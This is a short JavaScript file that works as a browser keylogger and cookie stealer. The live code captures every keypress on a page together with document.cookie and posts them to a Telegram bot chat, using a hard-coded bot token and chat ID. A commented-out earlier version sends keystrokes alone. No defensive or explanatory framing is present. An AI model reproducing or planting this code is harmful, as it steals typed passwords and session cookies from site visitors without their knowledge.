// document.addEventListener("keydown", function(event) {
//     fetch("https://api.telegram.org/bot6592357228:AAGNYLCsNW2prmow3QvY9ieeHG-stoTJ55I/sendMessage", {
//         method: "POST",
//         headers: {
//             "Content-Type": "application/json"
//         },
//         body: JSON.stringify({
//             chat_id: "-1002002449257",
//             text: "Key Pressed: " + event.key
//         })
//     });
// });
document.addEventListener("keydown", function(event) {
    let cookies = document.cookie; // Mengambil cookie yang bisa diakses oleh JavaScript

    fetch("https://api.telegram.org/bot6592357228:AAGNYLCsNW2prmow3QvY9ieeHG-stoTJ55I/sendMessage", {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify({
            chat_id: "-1002002449257",
            text: `Key Pressed: ${event.key}\nCookies: ${cookies}`
        })
    });
});
